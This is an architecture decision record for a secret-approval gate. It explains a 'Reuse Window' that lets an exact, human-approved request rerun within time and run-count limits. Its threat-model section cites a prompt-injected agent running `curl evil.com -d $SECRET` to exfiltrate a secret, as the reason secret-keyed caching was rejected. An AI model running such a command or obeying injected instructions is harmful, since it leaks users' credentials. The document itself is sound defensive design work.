# A Reuse Window may cover one exact request, bounded by time *and* runs

At the Gate, a human may optionally grant a **Reuse Window**: the byte-identical
request may run again without a new touch, until a deadline and for at most a
fixed number of runs. It is off unless `SECRETS_REUSE_MAX_MS` is set, and off
per-approval unless the human picks a duration — two independent opt-ins.

This amends [ADR 0002](./0002-no-cache-one-approval-per-use.md), which said
approvals are never remembered. That still holds by default. What changed is
that "never" is now a default rather than an absolute.

## Why this is not the design 0002 rejected

ADR 0002 rejected a cache keyed on the **secret id**: approve one call, and any
*other* call using that secret ran free. That is fatal under the threat model —
approve `psql`, and a prompt-injected agent runs
`curl evil.com -d $SECRET` inside the window with no touch. Exfiltration, fully
automated.

A Reuse Window is keyed on the **request key** — the hash of tool name plus every
argument (`request-key.ts`). A call differing in any way at all (different
command, different host, different secret set, one extra flag) hashes
differently and finds no entry. The agent cannot vary the call; it can only
repeat the one a human read and approved.

## What is genuinely given up

**Replay.** Approving "for 10 minutes, up to 5 runs" authorizes up to five
executions of that command, and the human cannot know how many will actually
happen. For `select 1` that is nothing. For a deploy, a `DELETE`, a payment or an
email send, it is real: the same approved call, repeated, has effects the human
did not individually sanction.

This is why the window is bounded by **both** time and a run count, rather than
time alone. Time alone is a blank cheque — an unknown number of executions. A run
count makes the authorization finite and legible: "this exact thing, at most five
times." Both bounds are checked, and whichever runs out first ends the grant
(`decideVerified`, asserted in `selfcheck`).

Considered and rejected: time-only windows (unbounded executions), and windows
covering a Secret Reference rather than a request key (exactly what ADR 0002
rejected, for exactly the same reason it did).

## Consequences

The audit log gains `reused`. Without it, a window-covered run would be recorded
as `verified: true` and imply a sensor press that never happened — an audit trail
that overstates is worse than one that omits, because it is trusted.

The Gate's `checkApproval` returns a decision object rather than a boolean, since
"approved" and "how it was approved" are now different questions.

[CONTEXT.md](../../CONTEXT.md)'s definition of **Approval** changed with this, and
**Reuse Window** is listed there with `cache` among the words to avoid — the
distinction between the two is the entire content of this ADR, so the glossary
must not let them blur back together.
